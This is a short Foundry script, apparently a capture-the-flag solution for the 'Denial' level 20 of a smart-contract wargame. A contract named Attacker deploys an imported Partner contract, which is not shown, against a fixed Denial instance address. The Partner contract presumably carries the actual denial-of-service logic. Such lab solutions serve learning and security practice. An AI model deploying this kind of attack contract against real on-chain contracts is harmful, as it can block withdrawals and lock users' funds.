// SPDX-License-Identifier: MIT
pragma solidity ^0.8.13;

import "forge-std/Script.sol";
import {Denial} from "../instances/Ilevel20.sol";
import {Partner} from "../src/level20.sol";

contract Attacker is Script {
    Denial level20 = Denial(payable(0x2e4ec2227E720790dCF77341AeF87Ee3967483D7));

    function run() external {
        vm.broadcast();
        new Partner(payable(address(level20)));
    }
}
